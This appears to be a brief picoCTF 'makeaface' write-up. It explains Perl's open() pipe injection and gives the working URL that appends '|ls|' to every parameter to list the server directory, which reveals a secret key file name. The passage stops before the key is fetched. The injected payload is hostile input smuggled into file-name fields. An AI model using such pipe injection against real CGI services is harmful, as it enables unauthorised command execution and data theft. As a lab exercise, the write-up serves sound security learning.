One thing that must be understood is the usage of piping in perl:
http://www.cgisecurity.com/lib/sips.html

This is a web exploit when opening a file. If you do not specify whether the file is opened an input or output, there is an option to put a '|' after the filename and run any command in the shell and have it piped to the user.

However, this problem requires you to run the pipe on all the parameters (each one opening a different file in the directory, but still running ls on the same directory).
The reason is that the print does a bitwise and of all the results from each file, so if the text in the files don't match up, nothing gets printed. So, all of them have to print the same thing for the bitwise and to give you something.


Solution is achieved by visiting this link:
http://makeaface.picoctf.com/index.cgi?Head=1.bmp|ls|&Hair=0.bmp|ls|&Nose=3.bmp|ls|&Mouth=1.bmp|ls|&Eyes=1.bmp|ls|

This is printed which is a listing of all the files:
SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
css.css
eyes1.bmp
eyes2.bmp
eyes3.bmp
eyes4.bmp
hair0.bmp
hair1.bmp
hair2.bmp
head1.bmp
head2.bmp
head3.bmp
head4.bmp
index.cgi
js.js
mouth1.bmp
mouth2.bmp
mouth3.bmp
nose1.bmp
nose2.bmp
nose3.bmp

Then you retrieve the key from:
